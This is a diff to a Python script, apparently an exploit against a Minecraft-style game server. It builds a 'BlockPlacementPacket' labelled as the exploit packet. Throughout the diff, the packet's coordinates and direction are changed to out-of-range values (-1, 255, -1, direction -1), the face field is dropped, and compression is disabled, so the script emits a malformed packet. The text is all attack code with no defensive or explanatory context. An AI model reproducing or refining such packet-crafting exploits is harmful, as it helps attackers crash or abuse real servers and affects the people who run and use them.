@@ -83,11 +83,10 @@ def main():
     exploit_packet_data = PacketBuffer()
 
     exploit_packet = BlockPlacementPacket()
-    exploit_packet.X = 0
-    exploit_packet.Y = 0
-    exploit_packet.Z = 0
-    exploit_packet.direction = 0
-    exploit_packet.face = 0
+    exploit_packet.X = -1
+    exploit_packet.Y = 255
+    exploit_packet.Z = -1
+    exploit_packet.direction = -1
     exploit_packet.held_item_id = 1
     exploit_packet.held_item_count = 1
     exploit_packet.held_item_damage = 0
@@ -96,7 +95,7 @@ def main():
     exploit_packet.cursor_position_y = 0
     exploit_packet.cursor_position_z = 0
 
-    exploit_packet.write(exploit_packet_data, compression_threshold=500)
+    exploit_packet.write(exploit_packet_data, compression_threshold=None)
     exploit_packet_data = exploit_packet_data.get_writable()
 
     print("Exploit packet length: " + str(len(exploit_packet_data)))
